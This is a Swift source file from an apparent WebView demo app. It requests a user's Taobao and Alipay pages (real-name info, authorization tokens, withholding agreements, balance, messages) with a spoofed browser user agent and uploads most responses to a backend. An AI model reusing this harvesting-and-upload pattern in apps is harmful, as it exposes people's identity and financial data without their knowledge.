//
//  TaoBaoSpider.swift
//  WKWebViewDemo
//
//  Created by Alan Ge on 2023/7/8.
//

import Foundation

enum TaoBaoSpiderType: String {
    case memberInfoURL = "https://member1.taobao.com/member/fresh/account_security.htm"
    case userName = "https://member1.taobao.com/member/fresh/certify_info.htm"
    case tokenManageURL = "https://openauth.alipay.com/auth/tokenManage.htm"
    case trashURL = "https://consumeprod.alipay.com/record/trashIndex.htm"
    case ordersURL = "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm"
    case ordersDetailURL = ""
    case messageURL = "https://couriercore.alipay.com/messager/new.htm"
    case mdeductAndTokenURL = "https://personalweb.alipay.com/account/mdeductAndToken.htm"
    case yebPurchaseURL = "https://yebprod.alipay.com/yeb/purchase.htm"
    case aliAccountIndexURL = "https://custweb.alipay.com/account/index.htm"
    
    var desc: String {
        switch self {
        case .memberInfoURL:
           return "用户信息"
        case .userName:
            return "实名信息"
        case .ordersURL:
            return "订单列表"
        case .ordersDetailURL:
            return "订单详情"
        case .messageURL:
            return "消息列表"
        case .tokenManageURL:
            return "授权列表"
        case .trashURL:
            return "回收站"
        case .mdeductAndTokenURL:
            return "阿里代扣"
        case .yebPurchaseURL:
            return "支付宝余额"
        case .aliAccountIndexURL:
            return "支付宝基本信息"
        }
    }
    
    var path: String {
        switch self {
        case .memberInfoURL:
           return "taobao_userinfo"
        case .userName:
            return "taobao_real_name"
        case .ordersURL:
            return "taobao_orders"
        case .ordersDetailURL:
            return "orderDetail"
        case .messageURL:
            return "parse_notice"
        case .tokenManageURL:
            return "parse_auth"
        case .trashURL:
            return "parse_trash"
        case .mdeductAndTokenURL:
            return "parse_withhold"
        case .yebPurchaseURL:
            return "yue_money"
        case .aliAccountIndexURL:
            return "parse_alipay_base_info"
        }
    }
}

class TaoBaoSpider {
    
    static let shared = TaoBaoSpider()
    let memberInfoURL = "https://member1.taobao.com/member/fresh/account_security.htm"
    let ordersURL = "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm"
    let tokenManageURL = "https://openauth.alipay.com/auth/tokenManage.htm"
    
    let myUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    
    func requestAlipay(type: TaoBaoSpiderType, success: ((String?) -> Void)? = nil){
        requestAlipay(url: type.rawValue, type: type, success: success)
    }
    
    func requestAlipay(url: String, type: TaoBaoSpiderType, success: ((String?) -> Void)? = nil){
        if let url = URL(string: url) {
            var request = URLRequest(url: url)
            request.httpMethod = "GET"
            request.setValue("keep-alive", forHTTPHeaderField: "connection")
            request.setValue("no-cache", forHTTPHeaderField: "pragma")
            request.setValue("no-cache", forHTTPHeaderField: "cache-control")
            request.setValue("*/*", forHTTPHeaderField: "accept")
            request.setValue("XMLHttpRequest", forHTTPHeaderField: "x-requested-with")
            request.setValue(myUA, forHTTPHeaderField: "user-agent")
            request.setValue("zh-CN,zh;q=0.9,en;q=0.8", forHTTPHeaderField: "accept-language")
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                print("==========\(type.desc)===========")
                guard let data = data, let _:URLResponse = response, error == nil else {
                    return
                }
                var content = data.decodeGB18030ToString()
                if content == "" {
                    content = String(data: data, encoding: .utf8) ?? ""
                }
                self.dataUpload(type: type, content: content)
                success?(content)
            }
            task.resume()
        }
    }
    
    private func dataUpload(type: TaoBaoSpiderType, content: String){
        switch type {
        case .ordersURL:
            break
        default:
            PostDataDTO.shared.postData(path: type.path, content: content)
        }
    }
}

extension Data {
    func decodeGB18030ToString() -> String {
        let cfEncoding = CFStringEncodings.GB_18030_2000
        let encoding = CFStringConvertEncodingToNSStringEncoding(CFStringEncoding(cfEncoding.rawValue))
        if let string = NSString(data: self, encoding: encoding) {
            return string as String
        } else {
            return ""
        }
    }
}

extension Collection {
    // 避免数组越界崩溃
    subscript (safe index: Index) -> Iterator.Element? {
        return indices.contains(index) ? self[index] : nil
    }
}
